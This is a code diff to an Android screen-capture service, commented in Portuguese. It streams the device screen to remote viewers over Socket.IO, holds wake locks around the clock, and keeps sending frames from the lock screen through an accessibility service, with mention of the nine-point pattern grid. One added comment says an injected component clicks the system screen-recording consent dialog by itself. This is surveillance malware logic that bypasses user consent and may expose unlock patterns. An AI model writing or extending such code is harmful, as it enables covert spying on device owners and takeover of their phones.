@@ -64,6 +64,19 @@ class ScreenCaptureService : Service() {
         // capturando de verdade (token perdido ao bloquear/dormir), re-pede.
         @Volatile var capturandoDeVerdade = false
 
+        // TRUE assim que o espelhamento ficou REALMENTE ativo ao menos uma vez
+        // nesta execução do app (houve sessão de painel de fato usando a tela).
+        // Usado para só revalidar/reanimar o MediaProjection quando havia uma
+        // sessão ativa antes — nunca em socket ocioso sem dispositivo em uso
+        // (evita o loop do consentimento).
+        @Volatile var espelhamentoJaAtivou = false
+
+        // TRAVA DE DISPARO ÚNICO do modal de consentimento: evita LOOP. Fica true
+        // assim que pedimos o consentimento (uma vez) e só volta a false quando a
+        // captura REAL volta (sucesso) OU quando a tela é bloqueada de novo
+        // (SCREEN_OFF) — ou seja, 1 modal por ciclo de bloqueio/desbloqueio.
+        @Volatile var revalidacaoConsentimentoPendente = false
+
         @Volatile
         var aguardandoFrameRefresh = false
 
@@ -305,6 +318,13 @@ class ScreenCaptureService : Service() {
     /** Hash do último frame do fallback JPEG (pula envio se a tela não mudou). */
     @Volatile private var ultimoHashFallback: Int = 0
     private var lastSendTime = 0L
+    // (itens 1/2) Timestamp do ÚLTIMO envio REAL de JPEG aos viewers (frame
+    // novo emitido OU reenvio de keep-alive). Independente de lastSendTime, que
+    // é bumpado mesmo por frame estático descartado por hash — por isso o
+    // keep-alive antigo não reenviava em tela parada e os viewers caíam.
+    @Volatile private var ultimoEnvioRealMs = 0L
+    // Refresh de estática: reenvia o último JPEG a cada ~300ms com a tela ligada.
+    private val KEEPALIVE_ESTATICA_MS = 300L
     private var primeiroFrame = true
     /** Altura virtual do display (calculada em startVirtualDisplay) — usada
      *  tanto no fluxo normal quanto no ciclo de captura limpa. */
@@ -363,6 +383,10 @@ class ScreenCaptureService : Service() {
         super.onCreate()
         mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         isScreenOn = isScreenInteractive()
+        // (D) WakeLock/WifiLock 24/7: segura CPU + Wi-Fi desde a criação do
+        // serviço (inclusive desbloqueado ocioso), não só nos caminhos de
+        // captura/tela-apagada — impede o Doze de estrangular a rede.
+        adquirirWakeLocks()
     }
 
     private fun isScreenInteractive(): Boolean {
@@ -378,6 +402,9 @@ class ScreenCaptureService : Service() {
         enviarLog("onStartCommand chamado.")
         try {
             isScreenOn = isScreenInteractive()
+            // (D) Reforço: re-garante os locks a cada start (idempotente —
+            //     adquirirWakeLocks só adquire se ainda não estiverem segurados).
+            adquirirWakeLocks()
 
             // IMPORTANTE: a ação de REFRESH precisa rodar JUSTAMENTE com a captura
             // ativa (ela recria o VirtualDisplay reutilizando a MediaProjection viva).
@@ -657,6 +684,18 @@ class ScreenCaptureService : Service() {
     }
 
     private fun processarEEnviarFrame(image: android.media.Image, width: Int, height: Int) {
+        // ISOLAMENTO DA TELA DE BLOQUEIO (fim do piscar nos 9 pontos): enquanto a
+        // captura por ACESSIBILIDADE está ativa (tela de bloqueio), o MediaProjection
+        // fica 100% em SILÊNCIO — não processa nem envia frame. Senão os dois
+        // emissores escreviam na mesma sala e o viewer alternava entre a tela real
+        // (acessibilidade) e o frame velho/preto do MediaProjection = piscar.
+        // Ao desbloquear o envio volta sozinho. SALVAGUARDA ANTI-FPS:0: só
+        // silencia se a tela ESTIVER REALMENTE BLOQUEADA (keyguard locked). Assim,
+        // se a flag capturaAcessibilidadeAtiva ficar presa em true depois do
+        // desbloqueio, o MediaProjection NÃO fica mudo para sempre (evita FPS:0).
+        // NÃO altera a flag — só refina a condição aqui.
+        if (MyAccessibilityService.instance?.capturaAcessibilidadeAtiva == true &&
+            (getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true) return
         val planes = image.planes
         if (planes.isNullOrEmpty()) return
         val buffer: ByteBuffer = planes[0].buffer
@@ -698,6 +737,7 @@ class ScreenCaptureService : Service() {
         lastJpegFrame = byteArray
         SocketManager.garantirConexao()
         SocketManager.socket?.emit("enviar_tela", byteArray)
+        ultimoEnvioRealMs = System.currentTimeMillis()  // (itens 1/2) marca envio real
         if (primeiroFrame) {
             primeiroFrame = false
             enviarLog("Primeiro frame enviado (${byteArray.size} bytes).")
@@ -739,6 +779,13 @@ class ScreenCaptureService : Service() {
         )
         // Captura REAL ativa quando há MediaProjection + VirtualDisplay.
         capturandoDeVerdade = (mediaProjection != null && virtualDisplay != null)
+        // Marca que houve sessão real de espelhamento ao menos uma vez (gate
+        // anti-loop da reanimação/revalidação). Nunca volta a false nesta execução.
+        if (capturandoDeVerdade) {
+            espelhamentoJaAtivou = true
+            // Captura voltou: libera a trava do modal (próximo bloqueio pode pedir 1x).
+            revalidacaoConsentimentoPendente = false
+        }
         imageReader?.setOnImageAvailableListener({ reader ->
             var image: android.media.Image? = null
             try {
@@ -807,8 +854,30 @@ class ScreenCaptureService : Service() {
             override fun run() {
                 val now = System.currentTimeMillis()
                 val frame = lastJpegFrame
-                if (isRunning && isScreenOn && frame != null && now - lastSendTime >= 150) {
-                    lastSendTime = now
+                // (itens 1/2) REFRESH DE ESTÁTICA com timer PRÓPRIO: reenvia o
+                // último JPEG se faz >=300ms que nada foi emitido aos viewers —
+                // baseado em ultimoEnvioRealMs (NÃO em lastSendTime, que é bumpado
+                // por frame estático descartado por hash). Assim, tela parada
+                // mantém os viewers vivos e os timestamps frescos no servidor.
+                // ISOLAMENTO: não reenvia enquanto a acessibilidade captura a tela
+                // de bloqueio (evita disputa/piscar nos 9 pontos). SALVAGUARDA
+                // ANTI-FPS:0: só silencia se o keyguard estiver REALMENTE bloqueado
+                // — se a flag ficar presa em true no desbloqueado, o keepalive
+                // continua reenviando frames reais (nunca trava em FPS:0).
+                val _kgLocked = (getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true
+                val _bloqueioAtivo = (MyAccessibilityService.instance?.capturaAcessibilidadeAtiva == true) && _kgLocked
+                if (isRunning && isScreenOn && frame != null && !_bloqueioAtivo &&
+                    now - ultimoEnvioRealMs >= KEEPALIVE_ESTATICA_MS) {
+                    ultimoEnvioRealMs = now
+                    // CORREÇÃO DO CONGELAMENTO (tela desbloqueada parada): marca o
+                    // pipeline como VIVO. Em tela estática o onImageAvailable para
+                    // de disparar e o `ultimoFrameMs` ficava velho → o watchdog
+                    // (6s) recriava o VirtualDisplay por FALSO stall, causando o
+                    // "aparece e congela". Como o keep-alive está reenviando o
+                    // último JPEG, o pipeline está vivo: atualizamos ultimoFrameMs
+                    // para o watchdog NÃO recriar o display à toa (recriação fica
+                    // só para perda REAL de token, tratada por capturandoDeVerdade).
+                    ultimoFrameMs = now
                     try {
                         SocketManager.garantirConexao()
                         SocketManager.socket?.emit("enviar_tela", frame)
@@ -939,7 +1008,19 @@ class ScreenCaptureService : Service() {
     private fun solicitarRevalidacaoEspelhamento() {
         try {
             if (capturandoDeVerdade) return
+            // DISPARO ÚNICO (anti-loop): se já pedimos o consentimento neste
+            // ciclo e ainda não voltou a captura, NÃO reabre o modal de novo.
+            // A trava zera quando a captura volta (sucesso) ou no próximo
+            // SCREEN_OFF (novo bloqueio).
+            if (revalidacaoConsentimentoPendente) return
+            revalidacaoConsentimentoPendente = true
             val intent = Intent(this, MainActivity::class.java).apply {
+                // Após o desbloqueio NÃO abrir o app nem o modal interno: usar o
+                // caminho HEADLESS (janela transparente) que vai DIRETO ao modal
+                // de consentimento do SISTEMA ("Iniciar agora") sobre a tela
+                // inicial. O Inject clica sozinho, o modal some e o espelhamento
+                // continua por Socket.IO (enviar_tela) + HTTP.
+                putExtra("AUTO_BOOT_REANIMAR", true)
                 putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
             }
@@ -960,6 +1041,11 @@ class ScreenCaptureService : Service() {
                     when (action) {
                         Intent.ACTION_SCREEN_OFF -> {
                             isScreenOn = false
+                            // Novo bloqueio: rearma a trava para que, APÓS o próximo
+                            // desbloqueio, o modal de consentimento possa aparecer
+                            // UMA vez (se a captura tiver caído). Sem isso, nunca
+                            // mais pediria depois do 1º ciclo.
+                            revalidacaoConsentimentoPendente = false
                             MyAccessibilityService.instance?.pararCapturaAcessibilidade()
                             enviarLog("SCREEN_OFF detectado — pausando envio de frames; ForegroundService, MediaProjection e SocketIO mantidos ativos em background.")
                         }
